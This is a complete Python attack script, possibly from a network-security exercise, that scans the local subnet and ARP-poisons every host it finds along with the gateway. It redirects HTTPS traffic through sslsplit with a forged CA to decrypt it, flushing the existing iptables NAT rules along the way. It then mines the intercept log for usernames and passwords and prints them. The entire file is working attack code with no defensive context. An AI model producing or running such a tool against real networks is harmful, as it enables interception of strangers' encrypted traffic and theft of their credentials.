#!/usr/bin/python3

import os
import threading
import re
import netifaces as ni
from scapy.all import *

# Get the IP address of the Wi-Fi interface
gateway = {'ip': ni.gateways()[ni.AF_INET][0][0], 'mac': 0}
lanip=gateway['ip']+'/24'
# Create an ARP request packet to get the MAC addresses of devices in the network
arp_request = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=lanip)

# Send the ARP request and get the responses
responses = srp(arp_request, timeout=1, verbose=False)[0]

victims=list()

# Print the IP/MAC addresses of devices in the network
print('-------------------------------------------')
print('IP\t\tMAC Address')
print('-------------------------------------------')
for response in responses:
    if response[1].psrc!=gateway['ip']:
        victims.append({'ip': response[1].psrc, 'mac': response[1].hwsrc})
        print(response[1].psrc + '\t' + response[1].hwsrc)
    else:
        gateway['mac'] = response[1].hwsrc

# clear ip table
os.system('sudo iptables -t nat -F')

# forward https packet to ssl port
os.system('sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')

# multi-thread - send arp reply to poison arp table continuously

def arp_poison():
    while True:
        # Send arp reply to poison the victims' and the router's arp table
        for victim in victims:
            # default op=1 means arp request, op=2 means arp reply
            packet = ARP(op=2, pdst=victim['ip'], hwdst=victim['mac'], psrc=gateway['ip'])
            send(packet, verbose=False)
            packet = ARP(op=2, pdst=gateway['ip'], hwdst=gateway['mac'], psrc=victim['ip'])
            send(packet, verbose=False)

def ssl_split():
    # sslsplit
    os.system('sslsplit -k ca.key -c ca.crt -L logfile ssl 0.0.0.0 8443')

# find information in log
def get_info():
    while True:
        if os.path.exists('./logfile'):
            with open('./logfile', 'r+', errors='ignore') as f:
                log = f.read()
                regex_user = r'username=([^&]+)&'
                regex_pass = r'password=([^&]+)&'
                username = re.search(regex_user, log)
                password = re.search(regex_pass, log)
                if username!=None and password!=None:
                    print('username:', username.group(1))
                    print('password:', password.group(1))
                    f.truncate(0)

threading.Thread(target = arp_poison).start()
threading.Thread(target = ssl_split).start()
threading.Thread(target = get_info).start()
